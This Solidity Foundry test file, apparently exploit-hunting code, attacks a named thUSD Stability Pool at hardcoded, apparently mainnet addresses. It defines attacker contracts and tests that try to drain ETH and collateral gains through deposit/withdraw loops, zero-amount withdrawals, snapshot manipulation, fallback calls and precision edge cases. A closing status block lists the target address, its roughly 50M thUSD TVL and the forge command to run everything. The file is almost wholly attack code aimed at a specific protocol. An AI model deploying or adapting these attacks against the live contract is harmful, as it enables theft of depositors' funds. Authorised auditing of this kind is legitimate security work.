// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IStabilityPool {
    function provideToSP(uint256 _amount) external;
    function withdrawFromSP(uint256 _amount) external;
    function withdrawETHGainToTrove(address _upperHint, address _lowerHint) external;
    function getTotalTHUSDDeposits() external view returns (uint256);
    function getDepositorCollateralGain(address _depositor) external view returns (uint256);
    function getCompoundedTHUSDDeposit(address _depositor) external view returns (uint256);
    function P() external view returns (uint256);
    function currentScale() external view returns (uint128);
    function currentEpoch() external view returns (uint128);
    function deposits(address) external view returns (uint256 initialValue, address frontEndTag);
    function depositSnapshots(address) external view returns (uint256 S, uint256 P, uint256 G, uint128 scale, uint128 epoch);
    function epochToScaleToSum(uint128 epoch, uint128 scale) external view returns (uint256);
    function epochToScaleToG(uint128 epoch, uint128 scale) external view returns (uint256);
    function lastCollateralError_Offset() external view returns (uint256);
    function lastTHUSDLossError_Offset() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IBorrowerOperations {
    function openTrove(uint256 _maxFeePercentage, uint256 _THUSDAmount, address _upperHint, address _lowerHint) external payable;
    function adjustTrove(uint256 _maxFeePercentage, uint256 _collWithdrawal, uint256 _THUSDChange, bool _isDebtIncrease, address _upperHint, address _lowerHint) external payable;
    function closeTrove() external;
}

interface ITroveManager {
    function liquidate(address _borrower) external;
    function liquidateTroves(uint256 _n) external;
    function getCurrentICR(address _borrower, uint256 _price) external view returns (uint256);
    function getTroveOwnersCount() external view returns (uint256);
    function getTroveFromTroveOwnersArray(uint256 _index) external view returns (address);
    function Troves(address) external view returns (uint256 debt, uint256 coll, uint256 stake, uint8 status, uint128 arrayIndex);
    function redeemCollateral(uint256 _THUSDamount, address _firstRedemptionHint, address _upperPartialRedemptionHint, address _lowerPartialRedemptionHint, uint256 _partialRedemptionHintNICR, uint256 _maxIterations, uint256 _maxFeePercentage) external;
    function MCR() external view returns (uint256);
    function CCR() external view returns (uint256);
}

interface IPriceFeed {
    function lastGoodPrice() external view returns (uint256);
    function fetchPrice() external returns (uint256);
}

// Attack contract that tries to manipulate SP gains
contract SPGainManipulator {
    IStabilityPool public sp;
    IERC20 public thusd;
    IBorrowerOperations public bo;
    address public owner;

    uint256 public ethGained;
    uint256 public thusdGained;
    bool public attackWorked;

    constructor(address _sp, address _thusd, address _bo) {
        sp = IStabilityPool(_sp);
        thusd = IERC20(_thusd);
        bo = IBorrowerOperations(_bo);
        owner = msg.sender;
    }

    function attack1_DepositWithdrawLoop(uint256 amount, uint256 iterations) external {
        thusd.approve(address(sp), type(uint256).max);

        uint256 ethBefore = address(this).balance;
        uint256 thusdBefore = thusd.balanceOf(address(this));

        for (uint i = 0; i < iterations; i++) {
            sp.provideToSP(amount);

            // Check if we have any gains
            uint256 gain = sp.getDepositorCollateralGain(address(this));
            if (gain > 0) {
                attackWorked = true;
            }

            sp.withdrawFromSP(amount);
        }

        uint256 ethAfter = address(this).balance;
        uint256 thusdAfter = thusd.balanceOf(address(this));

        ethGained = ethAfter > ethBefore ? ethAfter - ethBefore : 0;
        thusdGained = thusdAfter > thusdBefore ? thusdAfter - thusdBefore : 0;
    }

    function attack2_ClaimOrphanedGains() external {
        // Try to claim any gains without having deposited
        uint256 ethBefore = address(this).balance;

        try sp.withdrawFromSP(0) {
            // Withdrew 0 but might get ETH gains
        } catch {}

        uint256 ethAfter = address(this).balance;
        if (ethAfter > ethBefore) {
            attackWorked = true;
            ethGained = ethAfter - ethBefore;
        }
    }

    function attack3_WithdrawToTrove() external {
        // Try withdrawETHGainToTrove
        uint256 ethBefore = address(this).balance;

        try sp.withdrawETHGainToTrove(address(0), address(0)) {
            attackWorked = true;
        } catch {}

        ethGained = address(this).balance - ethBefore;
    }

    receive() external payable {
        ethGained += msg.value;
    }
}

// Contract that creates underwater trove for liquidation
contract UnderwaterTroveCreator {
    IBorrowerOperations public bo;
    ITroveManager public tm;
    IERC20 public thusd;
    IStabilityPool public sp;

    bool public troveCreated;
    uint256 public debtCreated;

    constructor(address _bo, address _tm, address _thusd, address _sp) {
        bo = IBorrowerOperations(_bo);
        tm = ITroveManager(_tm);
        thusd = IERC20(_thusd);
        sp = IStabilityPool(_sp);
    }

    function createMaxLeveragedTrove() external payable {
        // Create trove with maximum debt (minimum collateral ratio)
        // At 110% MCR: debt = coll * price / 1.1
        // At 150% CCR in recovery: debt = coll * price / 1.5

        uint256 maxDebt = msg.value * 4000 / 15; // Assuming $4000 ETH, 150% CR = 2666 thUSD per ETH

        try bo.openTrove{value: msg.value}(
            1e18, // max fee
            maxDebt,
            address(0),
            address(0)
        ) {
            troveCreated = true;
            (debtCreated, , , , ) = tm.Troves(address(this));
        } catch {}
    }

    receive() external payable {}
}

contract SPAggressiveExploit is Test {
    address constant STABILITY_POOL = 0xA18Ab4Fa9a44A72c58e64bfB33D425Ec48475a9f;
    address constant THUSD = 0xCFC5bD99915aAa815401C5a41A927aB7a38d29cf;
    address constant TROVE_MANAGER = 0x27D7D02AED6C4F95Ada2faf02DcCB9666D3abB8C;
    address constant BORROWER_OPS = 0x874a8ee5b4Cc0B9973c7c002FA891fc28666cAA9;
    address constant PRICE_FEED = 0x684645ccAB4d55863A149C52eC3176051Cdb732d;

    IStabilityPool sp = IStabilityPool(STABILITY_POOL);
    IERC20 thusd = IERC20(THUSD);
    ITroveManager tm = ITroveManager(TROVE_MANAGER);
    IBorrowerOperations bo = IBorrowerOperations(BORROWER_OPS);
    IPriceFeed pf = IPriceFeed(PRICE_FEED);

    function test_AGGRESSIVE_1_DepositWithdrawLoop() public {
        console.log("");
        console.log("========================================");
        console.log("  AGGRESSIVE: DEPOSIT/WITHDRAW LOOP");
        console.log("========================================");

        SPGainManipulator attacker = new SPGainManipulator(STABILITY_POOL, THUSD, BORROWER_OPS);
        deal(THUSD, address(attacker), 10_000_000 * 1e18);
        deal(address(attacker), 10 ether);

        uint256 spETHBefore = STABILITY_POOL.balance;

        attacker.attack1_DepositWithdrawLoop(1_000_000 * 1e18, 10);

        uint256 spETHAfter = STABILITY_POOL.balance;

        console.log("ETH gained:", attacker.ethGained());
        console.log("thUSD gained:", attacker.thusdGained());
        console.log("SP ETH before:", spETHBefore);
        console.log("SP ETH after:", spETHAfter);
        console.log("Attack worked:", attacker.attackWorked());

        if (attacker.ethGained() > 0 || attacker.thusdGained() > 0) {
            console.log(">>> EXPLOIT FOUND <<<");
        }
    }

    function test_AGGRESSIVE_2_OrphanedGains() public {
        console.log("");
        console.log("========================================");
        console.log("  AGGRESSIVE: ORPHANED GAINS CLAIM");
        console.log("========================================");

        SPGainManipulator attacker = new SPGainManipulator(STABILITY_POOL, THUSD, BORROWER_OPS);

        uint256 spETHBefore = STABILITY_POOL.balance;
        console.log("SP ETH (unclaimed liquidation gains):", spETHBefore);

        attacker.attack2_ClaimOrphanedGains();

        console.log("ETH claimed:", attacker.ethGained());
        console.log("Attack worked:", attacker.attackWorked());

        if (attacker.attackWorked()) {
            console.log(">>> ORPHANED GAINS EXPLOIT <<<");
        }
    }

    function test_AGGRESSIVE_3_SnapshotManipulation() public {
        console.log("");
        console.log("========================================");
        console.log("  AGGRESSIVE: SNAPSHOT MANIPULATION");
        console.log("========================================");

        // Get current state
        uint256 currentS = sp.epochToScaleToSum(0, 0);
        uint256 P = sp.P();

        console.log("Current S (sum):", currentS / 1e18);
        console.log("Current P (product):", P);

        // The S value represents accumulated collateral per unit deposit
        // If we can deposit with an old snapshot, we might claim gains we didn't earn

        address attacker = makeAddr("snapshot_attacker");
        deal(THUSD, attacker, 50_000_000 * 1e18); // Equal to pool
        deal(attacker, 100 ether);

        vm.startPrank(attacker);
        thusd.approve(STABILITY_POOL, type(uint256).max);

        // Deposit large amount
        uint256 depositAmt = 50_000_000 * 1e18;
        sp.provideToSP(depositAmt);

        // Get our snapshot
        (uint256 ourS, uint256 ourP, , , ) = sp.depositSnapshots(attacker);
        console.log("Our snapshot S:", ourS / 1e18);
        console.log("Our snapshot P:", ourP);

        // Check if there's a delta we can exploit
        uint256 sDelta = currentS - ourS;
        console.log("S delta:", sDelta);

        // Theoretical gain = deposit * (currentS - snapshotS) / snapshotP / DECIMAL_PRECISION
        if (sDelta > 0 && ourP > 0) {
            uint256 theoreticalGain = depositAmt * sDelta / ourP / 1e18;
            console.log("Theoretical gain (if formula exploitable):", theoreticalGain);
        }

        // Check actual gain
        uint256 actualGain = sp.getDepositorCollateralGain(attacker);
        console.log("Actual collateral gain:", actualGain);

        // Withdraw and check
        uint256 ethBefore = attacker.balance;
        uint256 thusdBefore = thusd.balanceOf(attacker);

        sp.withdrawFromSP(depositAmt);

        uint256 ethAfter = attacker.balance;
        uint256 thusdAfter = thusd.balanceOf(attacker);

        console.log("");
        console.log("ETH gained:", ethAfter - ethBefore);
        console.log("thUSD change:", int256(thusdAfter) - int256(thusdBefore) - int256(depositAmt));

        vm.stopPrank();

        if (ethAfter > ethBefore) {
            console.log(">>> SNAPSHOT MANIPULATION WORKED <<<");
        }
    }

    function test_AGGRESSIVE_4_CreateLiquidationThenCapture() public {
        console.log("");
        console.log("========================================");
        console.log("  AGGRESSIVE: CREATE LIQUIDATION TARGET");
        console.log("========================================");

        uint256 price = pf.lastGoodPrice();
        console.log("Current price:", price / 1e18);

        // Check current trove state
        uint256 troveCount = tm.getTroveOwnersCount();
        console.log("Current trove count:", troveCount);

        // We need to create a trove that will be liquidatable
        // At $4471 ETH price, MCR 110%:
        // For 1 ETH: max debt = 4471 / 1.1 = 4064 thUSD
        // To be at exactly 110%: debt = 4064 thUSD
        // To be underwater: debt > 4064 thUSD (but can't create)

        // Strategy: Create trove at edge, then hope price drops
        address attacker = makeAddr("liq_creator");
        deal(attacker, 100 ether);
        deal(THUSD, attacker, 10_000_000 * 1e18);

        vm.startPrank(attacker);

        // First deposit to SP to capture liquidation gains
        thusd.approve(STABILITY_POOL, type(uint256).max);
        sp.provideToSP(5_000_000 * 1e18);

        uint256 spGainBefore = sp.getDepositorCollateralGain(attacker);
        console.log("SP gain before:", spGainBefore);

        // Try to create a leveraged trove
        // CCR is 150%, so in normal mode we need 150% CR minimum
        // At $4471: for 10 ETH, max debt at 150% = 44710 / 1.5 = 29806 thUSD

        console.log("");
        console.log("Attempting to open leveraged trove...");
        try bo.openTrove{value: 10 ether}(
            1e18,
            29000 * 1e18, // Just under max
            address(0),
            address(0)
        ) {
            console.log("Trove created!");
            (uint256 debt, uint256 coll, , , ) = tm.Troves(attacker);
            uint256 icr = tm.getCurrentICR(attacker, price);
            console.log("Debt:", debt / 1e18);
            console.log("Coll:", coll / 1e18);
            console.log("ICR:", icr * 100 / 1e18, "%");

            // Now simulate price drop
            console.log("");
            console.log("Simulating price drop scenario...");

            // If price drops to $2500, ICR would be:
            // ICR = 10 * 2500 / debt
            uint256 newPrice = 2500 * 1e18;
            uint256 newICR = coll * newPrice / debt;
            console.log("At $2500 ETH, ICR would be:", newICR * 100 / 1e18, "%");

            if (newICR < 110e16) {
                console.log(">>> TROVE WOULD BE LIQUIDATABLE AT $2500 <<<");
            }

        } catch Error(string memory reason) {
            console.log("Trove creation failed:", reason);
        } catch {
            console.log("Trove creation failed (unknown reason)");
        }

        vm.stopPrank();
    }

    function test_AGGRESSIVE_5_DirectETHDrain() public {
        console.log("");
        console.log("========================================");
        console.log("  AGGRESSIVE: DIRECT ETH DRAIN ATTEMPT");
        console.log("========================================");

        uint256 spETH = STABILITY_POOL.balance;
        console.log("ETH in StabilityPool:", spETH);
        console.log("This ETH is from past liquidations");

        // The only way to get this ETH out is:
        // 1. Have a deposit and withdraw with gains
        // 2. Have the gains assigned to your deposit

        // Check if there are any depositors who haven't claimed
        // This would require scanning events, which we can't do easily

        // Try direct call to receive function
        address attacker = makeAddr("eth_drainer");
        deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // Try sending ETH to SP (should fail or be rejected)
        console.log("Attempting to send ETH to SP...");
        (bool success, ) = STABILITY_POOL.call{value: 0.1 ether}("");
        console.log("Send ETH success:", success);

        // Check for any fallback exploits
        console.log("Attempting empty call...");
        (success, ) = STABILITY_POOL.call("");
        console.log("Empty call success:", success);

        vm.stopPrank();

        console.log("");
        console.log("SP ETH after attempts:", STABILITY_POOL.balance);
    }

    function test_AGGRESSIVE_6_PrecisionEdgeCases() public {
        console.log("");
        console.log("========================================");
        console.log("  AGGRESSIVE: PRECISION EDGE CASES");
        console.log("========================================");

        // Test with very small and very large amounts
        address attacker = makeAddr("precision_attacker");
        deal(THUSD, attacker, 100_000_000 * 1e18);
        deal(attacker, 100 ether);

        vm.startPrank(attacker);
        thusd.approve(STABILITY_POOL, type(uint256).max);

        // Test 1: Minimum deposit
        console.log("=== Test: Minimum deposit ===");
        uint256 minDeposit = 1; // 1 wei of thUSD

        uint256 balBefore = thusd.balanceOf(attacker);
        sp.provideToSP(minDeposit);
        uint256 compounded = sp.getCompoundedTHUSDDeposit(attacker);
        sp.withdrawFromSP(type(uint256).max); // Withdraw all
        uint256 balAfter = thusd.balanceOf(attacker);

        console.log("Deposited:", minDeposit);
        console.log("Compounded:", compounded);
        console.log("Balance change:", int256(balAfter) - int256(balBefore));

        // Test 2: Maximum deposit
        console.log("");
        console.log("=== Test: Maximum deposit ===");
        uint256 maxDeposit = 99_000_000 * 1e18; // 99M (almost 2x pool)

        balBefore = thusd.balanceOf(attacker);
        sp.provideToSP(maxDeposit);
        compounded = sp.getCompoundedTHUSDDeposit(attacker);
        uint256 gain = sp.getDepositorCollateralGain(attacker);
        sp.withdrawFromSP(maxDeposit);
        balAfter = thusd.balanceOf(attacker);

        console.log("Deposited:", maxDeposit / 1e18);
        console.log("Compounded:", compounded / 1e18);
        console.log("Collateral gain:", gain);
        console.log("Balance change:", int256(balAfter) - int256(balBefore));

        // Test 3: Repeated tiny deposits
        console.log("");
        console.log("=== Test: 100 tiny deposits ===");
        uint256 tinyAmount = 1e18; // 1 thUSD
        uint256 totalGain = 0;

        for (uint i = 0; i < 100; i++) {
            sp.provideToSP(tinyAmount);
            totalGain += sp.getDepositorCollateralGain(attacker);
            sp.withdrawFromSP(tinyAmount);
        }

        console.log("Total gain from 100 cycles:", totalGain);
        console.log("ETH balance change:", attacker.balance);

        vm.stopPrank();
    }

    function test_FINAL_STATUS() public {
        console.log("");
        console.log("========================================");
        console.log("  STABILITY POOL EXPLOIT STATUS");
        console.log("========================================");

        console.log("");
        console.log("Target: 0xA18Ab4Fa9a44A72c58e64bfB33D425Ec48475a9f");
        console.log("TVL: ~50M thUSD");
        console.log("Unclaimed ETH: ~0.01 ETH (from past liquidations)");
        console.log("");
        console.log("Run all tests:");
        console.log("  forge test --match-contract SPAggressiveExploit -vvv");
    }
}
